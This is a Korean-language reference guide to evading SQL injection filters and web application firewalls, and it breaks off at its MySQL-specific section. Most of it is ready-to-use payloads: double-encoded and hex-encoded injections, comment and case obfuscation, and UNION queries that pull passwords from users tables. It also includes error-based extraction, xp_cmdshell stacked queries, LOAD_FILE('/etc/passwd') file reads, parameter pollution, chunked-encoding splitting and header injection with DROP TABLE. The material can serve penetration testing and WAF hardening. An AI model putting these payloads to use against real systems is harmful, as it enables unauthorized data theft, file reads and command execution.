# SQL Injection Bypass Techniques 완전 정복

> 필터/WAF 우회 기법 상세 문서
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [Bypass의 본질](#1-bypass의-본질)
2. [전처리 파이프라인 이해](#2-전처리-파이프라인-이해)
3. [Encoding Bypass](#3-encoding-bypass)
4. [Obfuscation Bypass](#4-obfuscation-bypass)
5. [Whitespace Bypass](#5-whitespace-bypass)
6. [Keyword/Operator 대체](#6-keywordoperator-대체)
7. [HTTP Level Bypass](#7-http-level-bypass)
8. [DBMS Specific Bypass](#8-dbms-specific-bypass)
9. [JSON/XML Context Bypass](#9-jsonxml-context-bypass)
10. [WAF 탐지 및 우회](#10-waf-탐지-및-우회)
11. [Filter Detection Logic](#11-filter-detection-logic)
12. [Bypass Decision Tree](#12-bypass-decision-tree)
13. [종합 Bypass Matrix](#13-종합-bypass-matrix)
14. [Safety & Ethics](#14-safety--ethics)

---

## 1. Bypass의 본질

### 1.1 필터가 차단하는 방식

```
┌─────────────────────────────────────────────────────────────┐
│                    필터의 동작 원리                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  입력 → [필터] → 통과/차단                                  │
│                                                              │
│  필터 유형:                                                  │
│  1. 블랙리스트: 특정 패턴 차단 (위험 문자/키워드)          │
│  2. 화이트리스트: 허용 패턴만 통과                          │
│  3. 정규식 기반: 패턴 매칭으로 탐지                         │
│  4. 시그니처 기반: 알려진 공격 패턴 DB 비교 (WAF)          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 우회의 핵심 원리

```
┌─────────────────────────────────────────────────────────────┐
│                    우회의 본질                               │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  필터가 보는 것 ≠ DB가 실행하는 것                         │
│                                                              │
│  필터: "UNION" 차단                                         │
│  우회: "UNI/**/ON" 전송 → 필터 통과                        │
│  DB:   "UNI/**/ON" → "UNION"으로 해석 → 실행               │
│                                                              │
│  ┌─────────┐    ┌─────────┐    ┌─────────┐                │
│  │ 공격자  │ →  │ 필터    │ →  │  DB     │                │
│  │ 변형    │    │ 미탐지  │    │ 원래대로│                │
│  │ 페이로드│    │ 통과    │    │ 해석    │                │
│  └─────────┘    └─────────┘    └─────────┘                │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.3 우회 전략의 계층

```
Level 1: 단순 변환 (인코딩, 케이스)
         → 기본 필터 우회

Level 2: 구조적 변환 (주석, 공백 대체)
         → 정규식 기반 필터 우회

Level 3: 프로토콜 레벨 (HTTP 조작)
         → WAF 우회

Level 4: 논리적 변환 (동등 표현 사용)
         → 시그니처 기반 탐지 우회

Level 5: 조합 (여러 기법 체인)
         → 고급 WAF 우회
```

---

## 2. 전처리 파이프라인 이해

### 2.1 입력 데이터 처리 흐름

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     웹 애플리케이션 입력 처리 파이프라인                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  [사용자 입력]                                                          │
│       ↓                                                                  │
│  ┌────────────────┐                                                     │
│  │ 1. 네트워크    │  HTTP 요청 수신                                    │
│  │    레이어      │  TLS 복호화                                         │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 2. WAF/IPS     │  시그니처 매칭, 패턴 탐지                          │
│  │    (외부)      │  ← 우회 포인트 ①                                   │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 3. 웹 서버     │  URL 디코딩 (1차)                                  │
│  │ (Apache/Nginx) │  파라미터 파싱                                      │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 4. 앱 서버     │  추가 디코딩 (2차 - Base64, JSON 등)               │
│  │ (PHP/Java/Py)  │  ← 우회 포인트 ②                                   │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 5. 애플리케이션│  입력 검증, 필터링                                  │
│  │    로직        │  ← 우회 포인트 ③                                   │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 6. ORM/DB      │  쿼리 빌딩, 이스케이프                              │
│  │    레이어      │  ← 우회 포인트 ④                                   │
│  └───────┬────────┘                                                     │
│          ↓                                                               │
│  ┌────────────────┐                                                     │
│  │ 7. 데이터베이스│  SQL 파싱, 실행                                     │
│  │                │  ← 최종 해석 지점                                   │
│  └────────────────┘                                                     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2.2 각 레이어별 우회 전략

```yaml
bypass_by_layer:
  # 우회 포인트 ①: WAF 이전/우회
  waf_bypass:
    techniques:
      - "인코딩 차이 (WAF vs 앱 디코딩 방식)"
      - "프로토콜 레벨 (HPP, Chunked)"
      - "원본 IP 직접 접근 (WAF 우회)"
    example: "WAF가 %27 디코딩 → 차단, %2527은 미탐지 → 앱에서 2차 디코딩"

  # 우회 포인트 ②: 웹서버-앱서버 차이
  server_difference:
    techniques:
      - "이중 디코딩 차이"
      - "파라미터 파싱 차이 (HPP)"
      - "Content-Type 해석 차이"
    example: "Nginx는 첫 파라미터, PHP는 마지막 파라미터 사용"

  # 우회 포인트 ③: 애플리케이션 필터 우회
  app_filter_bypass:
    techniques:
      - "대소문자 변환"
      - "주석 삽입"
      - "대체 함수/연산자"
      - "인코딩 체인"
    example: "UNION 블랙리스트 → UNI/**/ON 통과"

  # 우회 포인트 ④: ORM/DB 레이어 특성 활용
  db_layer_bypass:
    techniques:
      - "DBMS 특수 문법"
      - "캐릭터셋 차이"
      - "MySQL 버전 주석"
    example: "/*!50000UNION*/ → MySQL만 실행, 다른 DBMS 무시"
```

### 2.3 디코딩 순서와 우회

```
┌─────────────────────────────────────────────────────────────┐
│                    디코딩 순서 공격                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Case 1: 단일 디코딩 환경                                   │
│  ┌───────────┐    ┌───────────┐    ┌───────────┐           │
│  │ 입력      │ →  │ 디코더    │ →  │ 필터      │           │
│  │ %27       │    │ '         │    │ 차단!     │           │
│  └───────────┘    └───────────┘    └───────────┘           │
│                                                              │
│  우회: %2527                                                │
│  ┌───────────┐    ┌───────────┐    ┌───────────┐           │
│  │ 입력      │ →  │ 디코더    │ →  │ 필터      │           │
│  │ %2527     │    │ %27       │    │ 통과!     │           │
│  └───────────┘    └───────────┘    └───────────┘           │
│                         ↓                                    │
│                   ┌───────────┐    ┌───────────┐           │
│                   │ 2차 디코딩│ →  │ DB        │           │
│                   │ '         │    │ 주입 실행 │           │
│                   └───────────┘    └───────────┘           │
│                                                              │
│  Case 2: 필터 후 디코딩                                     │
│  ┌───────────┐    ┌───────────┐    ┌───────────┐           │
│  │ 입력      │ →  │ 필터      │ →  │ 디코더    │           │
│  │ %27       │    │ 통과      │    │ '         │           │
│  └───────────┘    └───────────┘    └───────────┘           │
│                                        ↓                     │
│                                   ┌───────────┐             │
│                                   │ DB 주입   │             │
│                                   └───────────┘             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 2.4 처리 순서 파악 테스트

```yaml
test_sequence:
  step_1:
    name: "기본 문자 테스트"
    payload: "'"
    purpose: "직접 특수문자 차단 여부"

  step_2:
    name: "URL 인코딩 테스트"
    payload: "%27"
    purpose: "인코딩 상태 필터링 vs 디코딩 후 필터링"

  step_3:
    name: "이중 인코딩 테스트"
    payload: "%2527"
    purpose: "이중 디코딩 환경 여부"

  step_4:
    name: "혼합 인코딩 테스트"
    payload: "%27OR%201%3D1"
    purpose: "부분 인코딩 처리 방식"

  analysis:
    - "%27 차단, %2527 통과": "1차 디코딩 후 필터 → 2차 디코딩 가능"
    - "%27 통과, ' 차단": "디코딩 전 필터링 → URL 인코딩 우회 가능"
    - "모두 차단": "다층 필터링 또는 정규화 후 필터"
```

---

## 3. Encoding Bypass

### 3.1 URL Encoding

```
원리: 특수문자를 %XX 형태로 변환
      필터가 디코딩 전에 검사하면 우회 가능

┌──────────┬──────────┬──────────────────────────────────────┐
│  원본    │  인코딩  │  설명                                │
├──────────┼──────────┼──────────────────────────────────────┤
│  '       │  %27     │  싱글 쿼트                           │
│  "       │  %22     │  더블 쿼트                           │
│  (space) │  %20     │  공백                                │
│  #       │  %23     │  해시 (MySQL 주석)                   │
│  -       │  %2D     │  하이픈 (-- 주석용)                  │
│  =       │  %3D     │  등호                                │
│  /       │  %2F     │  슬래시                              │
│  *       │  %2A     │  별표 (/* */ 주석용)                 │
│  \       │  %5C     │  백슬래시                            │
│  ;       │  %3B     │  세미콜론                            │
└──────────┴──────────┴──────────────────────────────────────┘

예시:
원본:    ' OR 1=1--
인코딩:  %27%20OR%201%3D1%2D%2D

효과적인 상황:
- 필터가 디코딩 전에 검사
- 단순 문자열 매칭 필터

비효과적인 상황:
- 필터가 디코딩 후 검사
- WAF가 자동 디코딩
```

### 3.2 Double URL Encoding

```
원리: URL 인코딩을 두 번 적용
      서버가 두 번 디코딩하면 원래 값 복원

┌──────────┬──────────┬──────────┐
│  원본    │  1차     │  2차     │
├──────────┼──────────┼──────────┤
│  '       │  %27     │  %2527   │
│  "       │  %22     │  %2522   │
│  (space) │  %20     │  %2520   │
│  =       │  %3D     │  %253D   │
└──────────┴──────────┴──────────┘

변환 원리:
' → %27 → %2527
      ↓
    % = %25
    2 = 2
    7 = 7

예시:
1차: ' OR 1=1    → %27%20OR%201%3D1
2차: %27%20OR... → %2527%2520OR%25201%253D1

효과적인 상황:
- 서버가 이중 디코딩 수행
- WAF가 한 번만 디코딩 후 검사
- 프록시/웹서버/앱서버 체인에서 각각 디코딩

테스트 방법:
1. %27 전송 → 차단됨
2. %2527 전송 → 통과하고 ' 로 해석되면 취약
```

### 3.3 Hex Encoding

```
원리: 문자열을 16진수로 표현
      SQL에서 0x 접두어로 문자열 인식

┌──────────────┬─────────────────────────────────────┐
│  원본        │  Hex                                │
├──────────────┼─────────────────────────────────────┤
│  'admin'     │  0x61646D696E                       │
│  'root'      │  0x726F6F74                         │
│  '           │  0x27                               │
│  test        │  0x74657374                         │
└──────────────┴─────────────────────────────────────┘

변환 방법:
a = 0x61
d = 0x64
m = 0x6D
i = 0x69
n = 0x6E
'admin' = 0x61646D696E

활용 예시:
-- 원본
SELECT * FROM users WHERE name = 'admin'

-- Hex 우회
SELECT * FROM users WHERE name = 0x61646D696E

-- LIKE 절에서
SELECT * FROM users WHERE name LIKE 0x25  -- % = 0x25

효과적인 상황:
- 쿼트(') 필터링
- 특정 문자열 블랙리스트

지원 DBMS:
- MySQL: ✅ 완전 지원
- MSSQL: ✅ 0x 형태 지원
- PostgreSQL: ⚠️ E'\x...' 또는 decode() 필요
- Oracle: ⚠️ UTL_RAW 필요
```

### 3.4 Unicode Encoding

```
원리: 유니코드 표현으로 필터 우회

┌──────────┬─────────────┬──────────────────────────┐
│  원본    │  Unicode    │  형태                    │
├──────────┼─────────────┼──────────────────────────┤
│  '       │  %u0027     │  IIS Unicode             │
│  '       │  \u0027     │  JavaScript Unicode      │
│  '       │  ＇         │  Full-width (U+FF07)     │
│  <       │  %u003C     │  IIS Unicode             │
│  >       │  %u003E     │  IIS Unicode             │
└──────────┴─────────────┴──────────────────────────┘

Full-width 문자 (특수):
┌──────────┬──────────┬──────────────────────────┐
│  원본    │ Full-width│  유니코드                │
├──────────┼──────────┼──────────────────────────┤
│  '       │  ＇       │  U+FF07                  │
│  "       │  ＂       │  U+FF02                  │
│  (       │  （       │  U+FF08                  │
│  )       │  ）       │  U+FF09                  │
│  <       │  ＜       │  U+FF1C                  │
│  >       │  ＞       │  U+FF1E                  │
└──────────┴──────────┴──────────────────────────┘

효과적인 상황:
- IIS 서버 (과거 버전)
- 유니코드 정규화 전 필터링
- Full-width 문자 미처리

주의:
- 현대 시스템에서는 대부분 비효과적
- 특수한 환경에서만 동작
```

### 3.5 HTML Entity Encoding

```
원리: HTML 엔티티로 변환
      브라우저/서버가 디코딩 후 처리

┌──────────┬──────────────┬──────────────┐
│  원본    │  Named       │  Numeric     │
├──────────┼──────────────┼──────────────┤
│  '       │  &apos;      │  &#39;       │
│  "       │  &quot;      │  &#34;       │
│  <       │  &lt;        │  &#60;       │
│  >       │  &gt;        │  &#62;       │
│  &       │  &amp;       │  &#38;       │
│  (space) │              │  &#32;       │
└──────────┴──────────────┴──────────────┘

Hex 형태:
' = &#x27;
" = &#x22;

활용:
- HTML 폼 입력에서 사용
- JavaScript 컨텍스트에서 사용

효과적인 상황:
- 입력이 HTML로 렌더링된 후 처리되는 경우
- 특수한 파싱 순서를 가진 애플리케이션
```

### 3.6 Base64 Encoding

```
원리: Base64로 인코딩된 값을 서버가 디코딩

┌────────────────┬─────────────────────────┐
│  원본          │  Base64                 │
├────────────────┼─────────────────────────┤
│  ' OR 1=1--    │  JyBPUiAxPTEtLQ==       │
│  admin         │  YWRtaW4=               │
│  SELECT        │  U0VMRUNUIA==           │
└────────────────┴─────────────────────────┘

효과적인 상황:
- 애플리케이션이 Base64 입력을 받는 경우
- JWT 토큰의 페이로드 부분
- API 파라미터가 Base64로 전송되는 경우

예시:
# 정상 요청
GET /api?data=eyJ1c2VyIjoiYWRtaW4ifQ==

# 주입 시도 (data 안에 SQLi 포함)
GET /api?data=eyJ1c2VyIjoiYWRtaW4nIE9SICcxJz0nMSJ9
```

---

## 4. Obfuscation Bypass

### 4.1 Case Variation (대소문자 변환)

```
원리: SQL 키워드는 대소문자 구분 안 함
      필터가 대소문자 구분하면 우회 가능

┌──────────┬──────────────────────────────────────┐
│  원본    │  변형                                │
├──────────┼──────────────────────────────────────┤
│  SELECT  │  SeLeCt, sElEcT, select, SELECT     │
│  UNION   │  UnIoN, uNiOn, union, UNION         │
│  AND     │  AnD, aNd, and, AND                 │
│  OR      │  Or, oR, or, OR                     │
│  FROM    │  FrOm, fRoM, from, FROM             │
│  WHERE   │  WhErE, wHeRe, where, WHERE         │
└──────────┴──────────────────────────────────────┘

예시:
-- 원본 (차단됨)
' UNION SELECT password FROM users--

-- Case 변환 (통과)
' uNiOn SeLeCt password FrOm users--

테스트 방법:
1. UNION 전송 → 차단
2. union 전송 → 통과? → Case-sensitive 필터
3. UnIoN 전송 → 확인

효과적인 상황:
- 단순 문자열 매칭 필터
- 대소문자 구분하는 블랙리스트

비효과적인 상황:
- 대소문자 무시 (case-insensitive) 필터
- 정규식에 /i 플래그 사용
```

### 4.2 Inline Comment (인라인 주석)

```
원리: /* */ 주석으로 키워드 분리
      SQL 파서는 주석 제거 후 키워드 인식

┌──────────────┬──────────────────────────────────┐
│  원본        │  주석 삽입                       │
├──────────────┼──────────────────────────────────┤
│  UNION       │  UN/**/ION, UNI/**/ON           │
│  SELECT      │  SEL/**/ECT, SELE/**/CT         │
│  AND         │  A/**/ND, AN/**/D               │
│  OR          │  O/**/R                         │
│  FROM        │  FR/**/OM, FRO/**/M             │
│  WHERE       │  WH/**/ERE, WHE/**/RE           │
└──────────────┴──────────────────────────────────┘

예시:
-- 원본 (차단됨)
' UNION SELECT password FROM users--

-- 주석 삽입 (통과)
' UN/**/ION SEL/**/ECT password FR/**/OM users--

-- 더 많은 주석
' U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T--

고급 변형:
-- 주석 내 쓰레기 값
' UN/*garbage*/ION SEL/*anything*/ECT--

-- 중첩 주석 (일부 파서)
' UN/*/**/*/ION--

효과적인 상황:
- 키워드 단위로 매칭하는 필터
- 주석 처리 없이 검사하는 WAF

비효과적인 상황:
- 주석 제거 후 검사하는 필터
- 고급 WAF
```

### 4.3 MySQL Version Comment

```
원리: /*!version code*/ - MySQL 버전 조건부 실행
      특정 버전 이상에서만 실행되는 주석

문법:
/*!50000 code*/  → MySQL 5.0 이상에서 실행
/*!40100 code*/  → MySQL 4.1 이상에서 실행
/*!32302 code*/  → MySQL 3.23.02 이상에서 실행

┌─────────────────────────┬─────────────────────────────────┐
│  버전 주석              │  실행 조건                      │
├─────────────────────────┼─────────────────────────────────┤
│  /*!50000 SELECT*/      │  MySQL 5.0.0 이상               │
│  /*!50700 SELECT*/      │  MySQL 5.7.0 이상               │
│  /*!80000 SELECT*/      │  MySQL 8.0.0 이상               │
│  /*! SELECT*/           │  모든 MySQL 버전                │
└─────────────────────────┴─────────────────────────────────┘

예시:
-- 원본 (차단됨)
' UNION SELECT password FROM users--

-- 버전 주석 (통과 가능)
' /*!50000UNION*/ /*!50000SELECT*/ password FROM users--

-- 전체 감싸기
'/*!50000 UNION SELECT password FROM users*/--

효과적인 상황:
- MySQL 환경
- /**/를 차단하지만 /*!*/는 미처리
- WAF가 MySQL 버전 주석 미인식

주의:
- MySQL 전용 기법
- 다른 DBMS에서는 일반 주석으로 처리 (무시됨)
```

### 4.4 String Concatenation (문자열 연결)

```
원리: 키워드를 문자열로 분리 후 연결
      DBMS가 런타임에 조합

DBMS별 연결 방법:
┌──────────────┬──────────────────────────────────────┐
│  DBMS        │  연결 방법                           │
├──────────────┼──────────────────────────────────────┤
│  MySQL       │  CONCAT('a','b'), 'a' 'b' (공백)    │
│  PostgreSQL  │  'a' || 'b'                         │
│  MSSQL       │  'a' + 'b'                          │
│  Oracle      │  'a' || 'b', CONCAT('a','b')        │
└──────────────┴──────────────────────────────────────┘

예시 (MySQL):
-- 원본
SELECT * FROM users

-- CONCAT 사용
SELECT * FROM users WHERE name = CONCAT('adm','in')

-- 공백 연결 (MySQL 특수)
SELECT * FROM users WHERE name = 'adm' 'in'
-- MySQL은 'adm' 'in' = 'admin' 으로 처리!

예시 (동적 실행):
-- MySQL
SET @q = CONCAT('SEL','ECT * FROM users');
PREPARE stmt FROM @q;
EXECUTE stmt;

-- MSSQL
EXEC('SEL' + 'ECT * FROM users')

효과적인 상황:
- 특정 문자열 블랙리스트
- 키워드 필터링
- 리터럴 값 필터링
```

### 4.5 CHAR/CHR Function

```
원리: ASCII 코드로 문자 생성
      필터가 문자를 직접 검사할 때 우회

DBMS별 함수:
┌──────────────┬──────────────┐
│  DBMS        │  함수        │
├──────────────┼──────────────┤
│  MySQL       │  CHAR()      │
│  PostgreSQL  │  CHR()       │
│  MSSQL       │  CHAR()      │
│  Oracle      │  CHR()       │
└──────────────┴──────────────┘

ASCII 코드표 (주요 문자):
┌──────┬──────┬──────┬──────┬──────┬──────┐
│  '   │  "   │ space│  =   │  -   │  /   │
│  39  │  34  │  32  │  61  │  45  │  47  │
└──────┴──────┴──────┴──────┴──────┴──────┘

예시 (MySQL):
-- 원본
SELECT * FROM users WHERE name = 'admin'

-- CHAR 사용
SELECT * FROM users WHERE name = CHAR(97,100,109,105,110)
-- a=97, d=100, m=109, i=105, n=110

-- 쿼트 우회
SELECT * FROM users WHERE name = CHAR(39) || 'admin' || CHAR(39)

예시 (MSSQL):
SELECT * FROM users WHERE name = CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)

효과적인 상황:
- 쿼트(') 필터링
- 특정 문자열 블랙리스트
- 키워드 필터링
```

### 4.6 Alternative String Representation

```
MySQL 특수 표현:
-- N'string' (National Character)
SELECT * FROM users WHERE name = N'admin'

-- _charset'string' (Character Set)
SELECT * FROM users WHERE name = _utf8'admin'

-- X'hex' (Hexadecimal)
SELECT * FROM users WHERE name = X'61646D696E'

-- B'binary' (Binary)
SELECT 0b01100001  -- = 97 = 'a'

PostgreSQL 특수 표현:
-- E'string' (Escape String)
SELECT * FROM users WHERE name = E'admin'

-- $$string$$ (Dollar Quoting)
SELECT * FROM users WHERE name = $$admin$$

-- $tag$string$tag$ (Tagged Dollar Quoting)
SELECT * FROM users WHERE name = $q$admin$q$

Oracle 특수 표현:
-- Q'[string]' (Quote Literal)
SELECT * FROM users WHERE name = Q'[admin]'
SELECT * FROM users WHERE name = Q'{admin}'

-- UNISTR (Unicode String)
SELECT UNISTR('\0061\0064\006D\0069\006E') FROM dual  -- 'admin'
```

---

## 5. Whitespace Bypass

### 5.1 공백 대체 문자

```
원리: SQL에서 공백 역할을 하는 다른 문자 사용

┌──────────────┬──────────────┬──────────────────────────┐
│  문자        │  URL 인코딩  │  설명                    │
├──────────────┼──────────────┼──────────────────────────┤
│  (space)     │  %20         │  일반 공백               │
│  (tab)       │  %09         │  탭                      │
│  (newline)   │  %0A         │  줄바꿈 LF               │
│  (CR)        │  %0D         │  캐리지 리턴             │
│  (CR+LF)     │  %0D%0A      │  윈도우 줄바꿈           │
│  (vtab)      │  %0B         │  수직 탭                 │
│  (form feed) │  %0C         │  폼 피드                 │
│  (nbsp)      │  %A0         │  Non-breaking space      │
└──────────────┴──────────────┴──────────────────────────┘

예시:
-- 원본 (공백 차단됨)
UNION SELECT

-- Tab으로 대체
UNION%09SELECT

-- Newline으로 대체
UNION%0ASELECT

-- 여러 개 조합
UNION%0D%0ASELECT

DBMS별 지원:
- MySQL: %09, %0A, %0B, %0C, %0D, %20, %A0
- PostgreSQL: %09, %0A, %0D, %20
- MSSQL: %09, %0A, %0D, %20
- Oracle: %09, %0A, %0D, %20
```

### 5.2 주석으로 공백 대체

```
원리: /**/ 주석이 공백 역할

예시:
-- 원본
UNION SELECT

-- 주석으로 대체
UNION/**/SELECT

-- 주석 안에 내용 추가
UNION/*anything*/SELECT
UNION/*abc123!@#*/SELECT

변형:
-- 여러 번 사용
SELECT/**/password/**/FROM/**/users

-- 줄바꿈 포함
UNION/*
*/SELECT

효과적인 상황:
- 공백 필터링
- 연속 키워드 탐지
```

### 5.3 괄호로 공백 제거

```
원리: SQL 문법상 괄호가 구분자 역할

예시:
-- 원본
UNION SELECT * FROM users

-- 괄호 사용
UNION(SELECT(password)FROM(users))

-- 중첩 괄호
UNION(SELECT(password)FROM((users)))

WHERE 절:
-- 원본
WHERE id = 1 OR 1=1

-- 괄호 사용
WHERE(id)=(1)OR(1)=(1)

효과적인 상황:
- 공백 필터링
- "UNION SELECT" 연속 패턴 탐지
```

### 5.4 플러스 기호 (MSSQL)

```
원리: MSSQL에서 + 가 공백 역할 가능

예시:
-- 원본
UNION SELECT

-- 플러스 사용
UNION+SELECT

-- URL 인코딩
UNION%2BSELECT

주의:
- MSSQL 전용
- 다른 DBMS에서는 연산자로 해석
```

---

## 6. Keyword/Operator 대체

### 6.1 논리 연산자 대체

```
┌──────────────┬──────────────────────────────────────┐
│  원본        │  대체                                │
├──────────────┼──────────────────────────────────────┤
│  AND         │  &&  (MySQL)                         │
│  OR          │  ||  (MySQL, PostgreSQL, Oracle)     │
│  NOT         │  !   (MySQL)                         │
│  XOR         │  (MySQL)                             │
└──────────────┴──────────────────────────────────────┘

예시:
-- 원본 (차단됨)
' OR 1=1--

-- 대체 (통과)
' || 1=1--      (MySQL)
' || '1'='1    (문자열 연결로 해석될 수 있음)

-- AND 대체
' && 1=1--
```

### 6.2 비교 연산자 대체

```
┌──────────────┬──────────────────────────────────────┐
│  원본        │  대체                                │
├──────────────┼──────────────────────────────────────┤
│  =           │  LIKE, REGEXP, RLIKE, <>, !=        │
│  <>          │  NOT ... =, !=                      │
│  >           │  NOT ... <=                         │
│  <           │  NOT ... >=                         │
└──────────────┴──────────────────────────────────────┘

예시:
-- 원본
WHERE id = 1

-- LIKE 사용
WHERE id LIKE 1

-- REGEXP 사용 (MySQL)
WHERE id REGEXP '1'
WHERE id RLIKE '1'

-- BETWEEN 사용
WHERE id BETWEEN 1 AND 1

-- IN 사용
WHERE id IN (1)

등호 없이 참 만들기:
' OR 'a' LIKE 'a
' OR 1 BETWEEN 1 AND 1--
' OR 1 IN (1)--
```

### 6.3 UNION 대체

```
┌──────────────────┬──────────────────────────────────┐
│  기법            │  예시                            │
├──────────────────┼──────────────────────────────────┤
│  UNION ALL       │  ' UNION ALL SELECT ...          │
│  (차이: 중복 포함)│                                  │
├──────────────────┼──────────────────────────────────┤
│  서브쿼리        │  AND (SELECT ...) = ...          │
│                  │  OR (SELECT ...) IS NOT NULL     │
└──────────────────┴──────────────────────────────────┘

UNION 없이 데이터 추출 (Error-based):
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--

-- MySQL
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 6.4 SELECT 대체

```
Stacked Query 환경:
-- 프로시저 사용 (MSSQL)
'; EXEC xp_cmdshell 'dir'--

-- 테이블 직접 접근 (MSSQL)
'; INSERT INTO log SELECT * FROM users--

File 기반 추출 (MySQL):
' UNION SELECT password INTO OUTFILE '/tmp/out.txt' FROM users--
' UNION SELECT LOAD_FILE('/etc/passwd')--
```

### 6.5 주석 대체

```
┌──────────────┬──────────────────────────────────────┐
│  DBMS        │  주석 방식                           │
├──────────────┼──────────────────────────────────────┤
│  MySQL       │  -- (공백필요), #, /* */             │
│  PostgreSQL  │  -- (공백필요), /* */                │
│  MSSQL       │  -- (공백필요), /* */                │
│  Oracle      │  -- (공백필요), /* */                │
└──────────────┴──────────────────────────────────────┘

-- 차단 시 대체:
' OR 1=1#           (MySQL)
' OR 1=1/*          (닫지 않아도 됨)
' OR '1'='1         (쿼트 밸런싱으로 주석 불필요)

NULL 바이트:
' OR 1=1%00         (일부 환경에서 문자열 종료)
```

### 6.6 함수 대체

```
문자열 추출:
┌──────────────────┬──────────────────────────────────┐
│  원본            │  대체                            │
├──────────────────┼──────────────────────────────────┤
│  SUBSTRING()     │  SUBSTR(), MID(), LEFT(), RIGHT()│
│  ASCII()         │  ORD() (MySQL)                   │
│  CHAR()          │  CHR() (PostgreSQL, Oracle)      │
│  CONCAT()        │  || (PostgreSQL, Oracle)         │
│                  │  + (MSSQL)                       │
│                  │  공백 (MySQL: 'a' 'b')           │
└──────────────────┴──────────────────────────────────┘

시간 지연:
┌──────────────────┬──────────────────────────────────┐
│  원본            │  대체                            │
├──────────────────┼──────────────────────────────────┤
│  SLEEP(5)        │  BENCHMARK(10000000,SHA1('x'))   │
│                  │  (SELECT ... RLIKE ... )반복     │
├──────────────────┼──────────────────────────────────┤
│  pg_sleep(5)     │  pg_sleep_for('5 seconds')       │
├──────────────────┼──────────────────────────────────┤
│  WAITFOR DELAY   │  무거운 쿼리로 시간 소모         │
└──────────────────┴──────────────────────────────────┘
```

---

## 7. HTTP Level Bypass

### 7.1 HTTP Parameter Pollution (HPP)

```
원리: 같은 파라미터를 여러 번 전송
      서버/WAF가 다르게 처리

┌──────────────────────────────────────────────────────────┐
│  기술 스택      │  처리 방식                            │
├──────────────────────────────────────────────────────────┤
│  PHP/Apache     │  마지막 값 사용                       │
│  ASP/IIS        │  모든 값 연결 (콤마)                  │
│  ASP.NET/IIS    │  모든 값 연결 (콤마)                  │
│  JSP/Tomcat     │  첫 번째 값 사용                      │
│  Python/Django  │  마지막 값 사용                       │
│  Node.js        │  배열로 처리                          │
└──────────────────────────────────────────────────────────┘

예시:
-- 요청
?id=1&id=' UNION SELECT password FROM users--

-- WAF: 첫 번째 값(1)만 검사 → 통과
-- 앱: 마지막 값(' UNION...) 사용 → SQLi 실행

변형:
?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/password/*&id=*/FROM/*&id=*/users
-- 앱이 연결하면: 1/**/UNION/**/SELECT/**/password/**/FROM/**/users
```

### 7.2 Parameter Fragmentation

```
원리: 페이로드를 여러 파라미터에 분산

예시:
-- 정상 요청
?query=SELECT name FROM users

-- 분산 요청 (앱이 조합하는 경우)
?q1=SELECT&q2=name&q3=FROM&q4=users

-- 주석 활용 분산
?id=1' UNION/*&sort=*/SELECT password FROM users--
-- 앱: ORDER BY [sort] WHERE id=[id]
-- 조합: ORDER BY */SELECT password FROM users-- WHERE id=1' UNION/*
```

### 7.3 HTTP Method 변환

```
원리: GET ↔ POST 변환, 다른 메서드 사용

예시:
-- GET 차단됨
GET /search?q=' OR 1=1--

-- POST로 변환
POST /search
Content-Type: application/x-www-form-urlencoded

q=' OR 1=1--

-- Method Override 헤더 사용
POST /search HTTP/1.1
X-HTTP-Method-Override: GET
X-HTTP-Method: GET
X-Method-Override: GET

q=' OR 1=1--
```

### 7.4 Content-Type 변환

```
원리: 다른 Content-Type으로 전송

┌──────────────────────────────────────────────────────────┐
│  Content-Type                  │  형식                   │
├──────────────────────────────────────────────────────────┤
│  application/x-www-form-urlencoded │  key=value&...     │
│  multipart/form-data           │  파일 업로드 형식      │
│  application/json              │  {"key":"value"}       │
│  application/xml               │  <key>value</key>      │
│  text/plain                    │  평문                   │
└──────────────────────────────────────────────────────────┘

예시:
-- Form (차단됨)
Content-Type: application/x-www-form-urlencoded
id=1' OR 1=1--

-- JSON으로 변환 (통과 가능)
Content-Type: application/json
{"id": "1' OR 1=1--"}

-- Multipart로 변환
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1' OR 1=1--
------WebKitFormBoundary--
```

### 7.5 Chunked Transfer Encoding

```
원리: 요청 본문을 청크로 분리
      WAF가 전체를 조합하지 못하면 우회

예시:
POST /search HTTP/1.1
Transfer-Encoding: chunked

4
id=1
5
' UNI
7
ON SEL
6
ECT--
0

-- 조합되면: id=1' UNION SELECT--

주의:
- 서버가 Chunked 지원해야 함
- 일부 WAF는 청크 조합 후 검사
```

### 7.6 Unicode/Encoding in Headers

```
원리: 헤더에 인코딩된 페이로드

예시:
-- Cookie에 주입
Cookie: session=abc; user=admin' OR '1'='1

-- User-Agent에 주입 (로깅되는 경우)
User-Agent: Mozilla<script>'; DROP TABLE users;--</script>

-- Referer에 주입
Referer: http://example.com/page?id=1' OR 1=1--

-- X-Forwarded-For에 주입
X-Forwarded-For: 127.0.0.1' OR '1'='1
```

---

## 8. DBMS Specific Bypass

### 8.1 MySQL Specific

```sql
-- 버전 주석 (최강 우회)
